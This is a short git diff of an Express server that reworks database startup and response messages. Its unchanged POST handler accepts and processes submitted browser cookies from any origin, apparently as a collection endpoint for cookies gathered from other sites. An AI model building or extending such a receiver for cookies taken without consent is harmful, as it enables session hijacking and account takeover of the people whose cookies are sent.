@@ -1,4 +1,4 @@
-require("./db")();
+const { main } = require("./db");
 // require("./cron")();
 
 const express = require("express");
@@ -12,14 +12,15 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 app.use(cors());
 
-app.get("/", (req, res) => {
-    res.json("success");
+app.get("/", async (req, res) => {
+    await main();
+    res.send({ status: "Server is Up and Running!" });
 });
 
 app.post("/", (req, res) => {
     console.log("New Cookies recieved!", req.body.url);
     utils.handleCookies(req.body);
-    res.json("Success!");
+    res.json("Data recieved successfully!");
 
 });
 
